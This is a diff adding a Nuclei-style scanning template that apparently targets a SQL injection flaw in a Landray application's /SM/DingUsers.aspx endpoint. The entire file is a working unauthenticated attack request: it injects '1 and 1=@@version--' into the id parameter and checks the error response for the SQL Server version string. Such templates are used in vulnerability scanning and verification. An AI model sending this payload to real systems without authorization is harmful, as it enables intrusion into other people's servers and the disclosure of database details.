@@ -1,0 +1,32 @@
+id: landray-DingUsers-sqlIjection
+
+info:
+  author: iSee857
+  name: landray-DingUsers-sqlIjection
+  severity: high
+  description: landray-DingUsers-sqlIjection
+  reference:
+    - https://github.com/iSee857
+  tags: unauth,admin-panel,yuanchuang
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /SM/DingUsers.aspx?id=1%20and%201=@@version--i HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL Server"
+          - "Microsoft" 
+        condition: and
+        part: body
+
+      - type: status
+        status:
+          - 500
